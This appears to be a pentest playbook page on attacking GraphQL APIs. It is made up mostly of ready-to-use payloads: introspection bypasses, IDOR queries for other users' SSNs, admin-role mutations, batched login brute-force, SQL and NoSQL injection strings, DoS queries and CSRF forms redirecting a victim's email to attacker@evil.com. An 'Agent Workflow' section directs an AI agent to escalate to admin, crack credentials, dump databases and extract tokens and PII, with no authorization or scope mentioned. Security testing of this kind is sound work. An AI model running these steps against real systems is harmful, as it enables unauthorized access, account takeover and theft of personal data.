# GraphQL

> **Summary**: GraphQL APIs expose a flexible query language that, when misconfigured, allows attackers to enumerate schemas, bypass authorization, batch brute-force attacks, and inject through resolvers.
> **Impact**: Information disclosure, authentication/authorization bypass, data exfiltration, denial of service, account takeover.
> **Typical Severity**: Medium | High | Critical (depends on exposure and authorization controls)

## Detection

### Indicators

- Responses containing `{"data":{"__typename":"Query"}}` confirm a GraphQL endpoint
- Error messages referencing GraphQL types, fields, or resolvers (e.g., `"Cannot query field"`, `"Did you mean"`)
- Endpoints returning JSON with `data` and `errors` keys
- Content-Type `application/json` with query/mutation structure in request body
- Interactive IDE interfaces (GraphiQL, GraphQL Playground) exposed to unauthenticated users

### Automated Detection

Fuzz common GraphQL paths:

```bash
ffuf -u https://<TARGET>/FUZZ -w <GRAPHQL_PATHS_WORDLIST> -mc 200,400,405
```

Common paths to include in the wordlist:

```
/graphql
/graphiql
/graphql.php
/graphql/console
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/v2/graphql
/query
/gql
/graphql/v1
```

Fingerprint the GraphQL engine:

```bash
python3 graphw00f.py -t https://<TARGET>/graphql
```

Universal query to confirm a GraphQL endpoint:

```graphql
query{__typename}
```

**Success criteria**: response contains `{"data":{"__typename":"Query"}}`.

### Manual Detection

1. Send the universal query `query{__typename}` via GET and POST to each candidate path
2. Test different Content-Types: `application/json`, `application/x-www-form-urlencoded`
3. Check for GraphiQL/Playground interfaces by browsing the endpoint in a browser
4. Trigger errors with malformed queries and inspect error messages for field/type suggestions:
   ```
   ?query={__schema}
   ?query={}
   ?query={doesNotExist}
   ```

## Exploitation

### Prerequisites

- A reachable GraphQL endpoint
- Depending on the attack: introspection enabled, weak authorization on resolvers, no query complexity limits

### Step-by-Step

#### 1. Introspection - Schema Enumeration

Send the introspection query to dump the full schema:

```graphql
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    name
                    description
                    type { name kind ofType { name kind ofType { name kind } } }
                    defaultValue
                }
                type { name kind ofType { name kind ofType { name kind } } }
                isDeprecated
                deprecationReason
            }
            inputFields { name type { name kind ofType { name kind } } }
            interfaces { name }
            enumValues(includeDeprecated: true) { name description }
            possibleTypes { name }
        }
        directives { name description args { name type { name kind ofType { name } } } }
    }
}
```

Quick inline version:

```
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}
```

**Success criteria**: response contains full type listing with field names and argument types.

#### 2. Introspection Bypass (When Disabled)

If introspection is blocked, try these bypasses:

- Insert a newline after `__schema`:
  ```json
  {"query": "query{__schema\n{queryType{name}}}"}
  ```
- Switch HTTP method (GET instead of POST, or `x-www-form-urlencoded`)
- Try via WebSocket:
  ```javascript
  ws = new WebSocket("wss://<TARGET>/graphql", "graphql-ws");
  ```
- Use field suggestion errors with [Clairvoyance](https://github.com/nikitastupin/clairvoyance) to reconstruct the schema without introspection

#### 3. Authorization Bypass

Test if queries/mutations enforce authorization beyond authentication:

1. Authenticate as a low-privilege user
2. Query objects belonging to other users by modifying ID arguments:
   ```graphql
   query { user(id: <VICTIM_ID>) { email, role, ssn } }
   ```
3. Attempt mutations that should be restricted:
   ```json
   {
     "operationName": "updateProfile",
     "variables": {"username": "<VICTIM>", "data": {"role": "admin"}},
     "query": "mutation updateProfile($username: String!, $data: ProfileInput!) { updateProfile(username: $username, data: $data) { username role } }"
   }
   ```
4. Chain queries: append an unauthorized query after an authorized one in the same operation

**Success criteria**: access to data or mutations that should be denied to the current user.

#### 4. Batching Brute-Force Attack

Bypass rate limiting by sending multiple authentication attempts in a single request:

Using aliases:

```graphql
mutation {
    a: login(email: "victim@target.com", password: "password1") { token }
    b: login(email: "victim@target.com", password: "password2") { token }
    c: login(email: "victim@target.com", password: "password3") { token }
    d: login(email: "victim@target.com", password: "password4") { token }
}
```

Using array-based batching:

```json
[
  {"query": "mutation { login(email:\"victim@target.com\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"victim@target.com\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"victim@target.com\", password:\"pass3\") { token } }"}
]
```

**Success criteria**: multiple login attempts processed in a single HTTP request, with one returning a valid token.

#### 5. Injection Through Resolvers

If resolver arguments are passed unsanitized to backends, inject through GraphQL parameters:

SQL Injection:

```graphql
query { user(name: "' OR 1=1 --") { id email } }
```

NoSQL Injection:

```graphql
query { user(search: "{\"username\": {\"$regex\": \".*\"}}") { id email } }
```

**Success criteria**: unexpected data returned, error messages from backend database, or time-based delay confirming injection.

#### 6. Denial of Service

**Deep nesting** (if no depth limit):

```graphql
query { user(id: 1) { friends { friends { friends { friends { friends { name } } } } } } }
```

**Alias overloading** (force repeated resolver execution):

```graphql
query {
    a0: __typename
    a1: __typename
    a2: __typename
    # ... repeat hundreds of times
}
```

**Directive overloading**:

```graphql
query { __typename @include(if: true) @include(if: true) @include(if: true) }
```

**Circular fragments** (CVE-2024-40094 in graphql-java):

```graphql
fragment A on Query { ...B }
fragment B on Query { ...A }
query { ...A }
```

**Success criteria**: server response time increases significantly, 5xx errors, or service becomes unavailable.

#### 7. CSRF via GraphQL

If the endpoint accepts GET requests or `x-www-form-urlencoded` POST without CSRF tokens:

GET-based CSRF:

```html
<img src="https://<TARGET>/graphql?query=mutation{changeEmail(email:\"attacker@evil.com\"){success}}">
```

Form-based CSRF:

```html
<form action="https://<TARGET>/graphql" method="POST">
  <input type="hidden" name="query" value="mutation{changeEmail(email:&quot;attacker@evil.com&quot;){success}}">
  <input type="submit">
</form>
```

**Success criteria**: mutation executes in the context of the authenticated victim's session.

### Payloads

**Introspection - compact schema dump**:

```
query={__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}
```

**Field suggestion probe** (trigger "Did you mean" errors):

```graphql
query { __type(name: "User") { fields { name } } }
```

**Batching template** (alias-based):

```graphql
mutation brute {
    attempt0: login(user: "<USER>", pass: "<PASS_0>") { token }
    attempt1: login(user: "<USER>", pass: "<PASS_1>") { token }
    attempt2: login(user: "<USER>", pass: "<PASS_2>") { token }
}
```

### Proof of Concept

```bash
# Confirm introspection is enabled
curl -s -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types[].name'

# Dump all query and mutation names
curl -s -X POST https://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name}} mutationType{fields{name}}}}"}' | jq .
```

## Bypasses

| Defense | Bypass Technique |
|---------|------------------|
| Introspection disabled via regex on `__schema` | Insert newline, space, or comma after `__schema` |
| POST-only introspection block | Try GET request or `x-www-form-urlencoded` Content-Type |
| WAF blocking introspection keywords | Use WebSocket transport or URL-encoded inline query |
| Rate limiting on HTTP requests | Alias-based or array-based batching in a single request |
| Query depth limiting | Use aliases and field duplication instead of nesting |
| CSRF protection via `application/json` Content-Type | Switch to `x-www-form-urlencoded` or GET |
| Field-level authorization | Chain authorized and unauthorized queries in one operation |

## Escalation

- **Introspection + IDOR**: enumerate types via introspection, then access other users' data by changing ID parameters -- see [idor.md](idor.md)
- **Batching + Credential brute-force**: bypass rate limiting to brute-force login or OTP -- see [rate-limit-bypass.md](rate-limit-bypass.md)
- **Resolver injection + SQLi/NoSQLi**: inject through resolver arguments to dump databases -- see [sqli.md](sqli.md), [nosql.md](nosql.md)
- **CSRF via GraphQL**: perform state-changing mutations in victim's session -- see [csrf.md](csrf.md)
- **Mutations + privilege escalation**: modify user roles or account data via unauthorized mutations -- see [idor.md](idor.md)
- **Schema disclosure + targeted exploitation**: use full schema to identify sensitive fields, hidden mutations, and debug endpoints

## Tools

| Tool | Usage |
|------|-------|
| [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) | `python3 graphqlmap.py -u https://<TARGET>/graphql --inject` -- CLI client and automated injection |
| [InQL](https://github.com/doyensec/inql) | Burp extension and CLI for schema analysis, batch attacks, and scanner: `python3 inql.py -t https://<TARGET>/graphql` |
| [Clairvoyance](https://github.com/nikitastupin/clairvoyance) | Schema reconstruction when introspection is disabled using field suggestion errors |
| [GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager) | Visual schema explorer -- paste introspection output to view relationships |
| [graphw00f](https://github.com/dolevf/graphw00f) | Fingerprint the GraphQL engine (Apollo, graphql-java, Hasura, etc.) |
| [graphql-cop](https://github.com/dolevf/graphql-cop) | Test for common GraphQL misconfigurations and security issues |
| [BatchQL](https://github.com/assetnote/batchql) | Security auditing with focus on batch query and mutation attacks |
| [GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler) | Schema grabbing, sensitive data search, authorization testing |
| [GQLSpection](https://github.com/doyensec/GQLSpection) | Successor to InQL standalone/CLI modes |
| [GraphiQL](https://github.com/graphql/graphiql) | In-browser GraphQL IDE for manual testing |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for GraphQL vulnerabilities.

### Phase 1: Discovery
1. Fuzz common GraphQL endpoint paths against `<TARGET>`:
   ```bash
   ffuf -u https://<TARGET>/FUZZ -w <GRAPHQL_PATHS_WORDLIST> -mc 200,400,405
   ```
   Paths to test: `/graphql`, `/graphiql`, `/v1/graphql`, `/v2/graphql`, `/api/graphql`, `/graphql/api`, `/query`, `/gql`, `/graphql/console`.
2. For each discovered endpoint, send the universal confirmation query:
   ```
   POST <ENDPOINT> {"query":"query{__typename}"}
   ```
   If response contains `{"data":{"__typename":"Query"}}`, the endpoint is confirmed as GraphQL.
3. Fingerprint the GraphQL engine:
   ```bash
   python3 graphw00f.py -t https://<TARGET>/<ENDPOINT>
   ```
4. Check if GraphiQL or GraphQL Playground is exposed by browsing the endpoint in a browser.
5. Test both `GET` and `POST` methods, and both `application/json` and `application/x-www-form-urlencoded` Content-Types.

### Phase 2: Validation
1. Send the full introspection query to dump the schema:
   ```
   POST <ENDPOINT> {"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}"}
   ```
   If the schema is returned, introspection is enabled -- map all types, queries, mutations, and subscriptions.
2. If introspection is blocked, attempt bypass techniques:
   - Insert newline after `__schema`: `{"query":"query{__schema\n{queryType{name}}}"}`
   - Switch HTTP method (GET vs POST).
   - Try WebSocket transport: `wss://<TARGET>/<ENDPOINT>`.
   - Use Clairvoyance to reconstruct the schema from field suggestion errors.
3. From the schema, identify sensitive queries (e.g., `users`, `adminSettings`, `internalData`) and mutations (e.g., `updateRole`, `deleteUser`, `changePassword`).
4. Test field suggestions by sending malformed queries:
   ```graphql
   query { __type(name: "User") { fields { name } } }
   ```

### Phase 3: Exploitation
1. **Authorization bypass**: Authenticate as a low-privilege user and query objects belonging to other users by modifying ID arguments:
   ```graphql
   query { user(id: <VICTIM_ID>) { email, role, ssn } }
   ```
2. **Privileged mutations**: Attempt mutations that should be restricted:
   ```graphql
   mutation { updateProfile(username: "<VICTIM>", data: {role: "admin"}) { username role } }
   ```
3. **Batching brute-force**: Send multiple authentication attempts in a single request using aliases:
   ```graphql
   mutation { a: login(email: "<EMAIL>", password: "<PASS_1>") { token } b: login(email: "<EMAIL>", password: "<PASS_2>") { token } }
   ```
4. **Injection through resolvers**: Test for SQLi, NoSQLi in resolver arguments:
   ```graphql
   query { user(name: "' OR 1=1 --") { id email } }
   ```
5. **CSRF via GraphQL**: If the endpoint accepts GET requests or `x-www-form-urlencoded` without CSRF tokens, craft a CSRF PoC.
6. **DoS**: Test deep nesting, alias overloading, and directive overloading if query complexity limits are absent.

### Phase 4: Escalation
1. Combine introspection results with IDOR testing to access every user's data systematically.
2. Use batching brute-force to crack login credentials or OTPs, bypassing rate limiting.
3. If SQLi/NoSQLi is confirmed through resolvers, escalate to full database dump.
4. Use privileged mutations to elevate your account to admin and access admin-only endpoints.
5. Extract sensitive data: API keys, tokens, PII, internal configuration from exposed queries.
6. Chain CSRF via GraphQL mutations to perform state-changing actions in the victim's session.

## Decision Tree

```
Start: Discover GraphQL endpoint
  |
  +---> Introspection enabled?
  |       +---> Yes: Dump full schema -> identify sensitive queries/mutations
  |       +---> No: Try bypass (newline, GET, WebSocket)
  |               +---> Bypass works? -> Dump schema
  |               +---> No bypass: Use Clairvoyance (field suggestion brute-force)
  |
  +---> Schema obtained?
  |       +---> Test authorization on each query/mutation (IDOR, privilege escalation)
  |       +---> Test batching (alias + array) for rate-limit bypass
  |       +---> Test injection in resolver arguments (SQLi, NoSQLi)
  |
  +---> No schema?
          +---> Fuzz common query/mutation names
          +---> Test batching blind brute-force
```

## Success Criteria
- [ ] GraphQL endpoint discovered and confirmed via `__typename` query
- [ ] Schema enumerated (via introspection or Clairvoyance)
- [ ] Unauthorized data accessed via queries that should be restricted to other users or roles
- [ ] Privileged mutation executed (e.g., role change, data modification) from low-privilege account
- [ ] Batching attack successfully bypasses rate limiting (multiple attempts in single request)
- [ ] Injection confirmed via resolver arguments (SQLi/NoSQLi)

## References

- https://portswigger.net/web-security/graphql
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md
- https://lab.wallarm.com/graphql-batching-attack/
- https://blog.doyensec.com/2021/05/20/graphql-csrf.html
- https://jondow.eu/practical-graphql-attack-vectors/
- https://github.com/nicholasaleks/graphql-threat-matrix
- https://github.com/Escape-Technologies/graphql-wordlist
- https://graphql.org/learn/introspection/
